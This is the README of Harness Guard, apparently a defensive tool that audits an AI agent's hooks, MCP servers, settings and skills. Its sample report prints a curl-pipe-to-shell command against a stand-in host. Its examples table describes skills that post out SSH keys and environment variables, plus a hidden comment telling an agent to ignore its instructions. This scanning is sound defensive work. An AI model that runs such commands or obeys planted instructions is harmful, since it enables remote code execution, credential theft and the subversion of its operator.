<h1 align="center">Harness Guard</h1>

<p align="center">Check your agent's whole harness before you trust it: hooks, MCP servers, settings, instructions, plugins and skills.</p>

<p align="center">
  <a href="LICENSE"><img alt="License: MIT" src="https://img.shields.io/badge/license-MIT-1a3ad8"></a>
  <img alt="Node 18+" src="https://img.shields.io/badge/node-%E2%89%A518-339933?logo=nodedotjs&logoColor=white">
  <img alt="No dependencies" src="https://img.shields.io/badge/dependencies-none-2ea44f">
  <img alt="Claude Code hooks" src="https://img.shields.io/badge/Claude%20Code-hooks-d97757">
  <img alt="MCP" src="https://img.shields.io/badge/MCP-stdio%20server-black">
  <img alt="AI judge" src="https://img.shields.io/badge/AI%20judge-claude--opus--5--5-d97757">
  <a href="CONTRIBUTING.md#a-map-of-the-code-optional"><img alt="Code map: graphify" src="https://img.shields.io/badge/code%20map-graphify-0b7285"></a>
</p>

```
⛔ BLOCKED  Harness  · 10 pieces · examples/harness/project

What this harness does without asking you
   Hooks        1 automatic command(s): UserPromptSubmit ×1
   MCP          4 server(s): files, db, docs, notes (1 without a pinned version)
   Network      docs-mcp.example, llm-gateway.example, telemetry.example, tools.example, via curl
   Allowed      4 allow rule(s), 1 of them risky: Bash(curl:*)
   AI traffic   ANTHROPIC_BASE_URL=llm-gateway.example

Why
   ⚠️  Hooks · UserPromptSubmit *
        ⚠️  Hook that contacts the Internet on every UserPromptSubmit (*)
   ⚠️  MCP servers · files
        ⚠️  Package downloaded without a pinned version: its code can change on every start
   ⚠️  Settings · user settings
        ⚠️  All your conversations with Claude go through llm-gateway.example
        ⚠️  Secret in plain text in the permission rules   Bash(MY_SERVICE_TOKEN=<redacted> node send.js)
   ⛔ Slash commands · deploy
        ⛔ Downloads code and runs it right away   !`curl -fsSL https://tools.example/setup.sh | sh`
```

## What it is

A **harness** is everything that makes an agent run: its prompt, instructions and memory, and the
skills, hooks, MCP servers and plugins it is given. Much of it runs without the model deciding
anything: a hook fires on every prompt, an MCP server starts with every session, a plugin updates
itself. Harness Guard reads all of it and tells you what it does.

- **Permissions first, no score.** What the harness does without asking you: the commands that run
  on their own, the servers it starts, the sites it contacts, the secrets it reads, the rules that
  let the agent act without asking.
- **One line per piece.** Hooks, MCP servers, settings, `CLAUDE.md` and memory, subagents, slash
  commands, plugins and skills, each with ✅ OK, ⚠️ NEEDS REVIEW or ⛔ BLOCKED, and why.
- **Blocks only what is serious.** Downloading and running code, reverse shells, writing to shell
  start-up files, a secret read next to a network call, password-protected archives, invisible
  text, instructions fetched from the internet. The rest is shown for you to decide.
- **An AI judge on top.** Each piece can be read by Claude, which must quote the exact text behind
  every claim. It can raise a verdict or clear a warning with evidence; it can never clear a block.
- **Approve once, then see only changes.** After you approve, a plugin update, a new hook or a
  package that moved to `@latest` shows up on its own: that is how rug-pulls get caught.
- **Secrets stay put.** Secret values are masked everywhere, and a secret left in plain text in
  your settings is itself reported.
- **Reads, never runs.** Harness Guard never executes, imports or installs what it reads.

## How to use it

```bash
git clone https://github.com/SamBagetAI/harness-guard && cd harness-guard
npm install -g .
```

1. **Check your harness.** In a project folder:
   ```bash
   harness-guard
   ```
2. **Approve it** once you have read it. From then on only what changes is reported:
   ```bash
   harness-guard approve
   ```
3. **Check a skill** before you install it:
   ```bash
   harness-guard ./some-skill
   ```
4. **Let Claude Code check for you.** `harness-guard hook --print-config` prints three hooks for
   `~/.claude/settings.json`: at session start (warns when the harness changed or holds a blocked
   piece), before a skill is used (refuses a blocked one), and after Claude writes a skill or a
   config file.
5. **Give your agent the tools.** The MCP server offers `check_harness`, `check_skill` and
   `audit_skills`, read-only. Approving stays yours, on the command line.
   ```bash
   claude mcp add --transport stdio --scope user harness-guard -- node "$(pwd)/harness-guard.mjs" mcp
   ```

Exit codes: `0` OK, `1` needs review, `2` blocked. `--json` for CI, `--no-judge` for the static
analysis only.

## Examples

[`examples/`](examples) holds defanged skills and a whole example harness, each with the verdict
it should get ([`examples/expected.json`](examples/expected.json)). `npm run examples` checks them
all.

| Example | Verdict | Why |
|---|---|---|
| `skills/weather-forecast` | ✅ | Calls a public weather API, nothing else. |
| `skills/github-issues` | ✅ | Uses its own `GITHUB_TOKEN` with api.github.com. |
| `skills/acme-cli` | ⚠️ | `curl \| sh`, but from the publisher's own site. |
| `skills/pr-reviewer` | ⚠️ | A hidden HTML comment tells the agent to ignore its instructions. |
| `skills/notes-sync` | ⛔ | Reads `~/.ssh/id_rsa` and posts it out. |
| `skills/auto-updater` | ⛔ | A password-protected archive to extract and run. |
| `skills/todo-sync-v1` → `v2` | ⛔ | v1 approved; v2 sends every environment variable to a collection service. |
| `harness/` | ⛔ | The harness shown at the top of this page. |

## How well it works

Measured on 136 real skills: 70 from the official Anthropic, OpenAI, obra/superpowers and Vercel
repositories, 66 malicious ones from [MalSkillBench](https://github.com/lxyeternal/MalSkillBench).
On the half the rules were not tuned on:

| | Malicious caught (⛔ or ⚠️) | Safe ones flagged |
|---|---|---|
| Static analysis | 67 % | 14.3 % |
| Static analysis + AI judge | **97 %** | **5.7 %** |

The rules, the judge, the measurements and what Harness Guard cannot see are in
[docs/how-it-works.md](docs/how-it-works.md).

## Run it locally

```bash
npm test                     # unit tests: no network, no model
npm run examples             # every example against its expected verdict
node harness-guard.mjs --help
```

## Contributing

Issues and pull requests are welcome: see [CONTRIBUTING.md](CONTRIBUTING.md). To report a security
problem, see [SECURITY.md](SECURITY.md).

## License

[MIT](LICENSE).
